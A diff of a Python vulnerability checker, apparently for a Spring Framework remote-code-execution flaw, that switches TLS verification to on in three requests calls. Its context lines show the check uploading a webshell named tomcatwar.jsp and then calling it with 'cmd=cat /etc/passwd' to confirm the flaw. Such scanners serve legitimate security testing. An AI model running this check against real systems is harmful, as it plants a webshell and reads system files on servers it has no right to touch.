@@ -44,14 +44,14 @@ def check(url, dns_domain, proxies=None):
 
     try:
         url_with_payload = url + arg_payload
-        requests.get(url_with_payload, headers=headers, verify=False, timeout=TIMEOUT, proxies=proxies)
+        requests.get(url_with_payload, headers=headers, verify=True, timeout=TIMEOUT, proxies=proxies)
 
         # 等待上传完成
         time.sleep(5)
 
         # 开始请求上传的webshell文件
         target_url = urljoin(url, 'tomcatwar.jsp?pwd=j&cmd=cat /etc/passwd')
-        res = requests.get(target_url, timeout=TIMEOUT, stream=True, verify=False, proxies=proxies)
+        res = requests.get(target_url, timeout=TIMEOUT, stream=True, verify=True, proxies=proxies)
         logger.debug(Fore.CYAN + f"[{res.status_code}]" + Fore.BLUE + f"[{res.headers}]", extra={"target": target_url})
         if res.status_code == 200 and "root:" in res.text:
             logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": target_url})
@@ -64,7 +64,7 @@ def check(url, dns_domain, proxies=None):
             parsed_url = urlparse(target_url)
             root_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
             target_url_root = urljoin(root_url, 'tomcatwar.jsp?pwd=j&cmd=cat /etc/passwd')
-            response_root = requests.get(target_url_root, timeout=TIMEOUT, stream=True, verify=False, proxies=proxies)
+            response_root = requests.get(target_url_root, timeout=TIMEOUT, stream=True, verify=True, proxies=proxies)
             logger.debug(Fore.CYAN + f"[{response_root.status_code}]" + Fore.BLUE + f"[{response_root.headers}]", extra={"target": target_url_root})
             if response_root.status_code == 200 and "root:" in response_root.text:
                 logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": target_url_root})
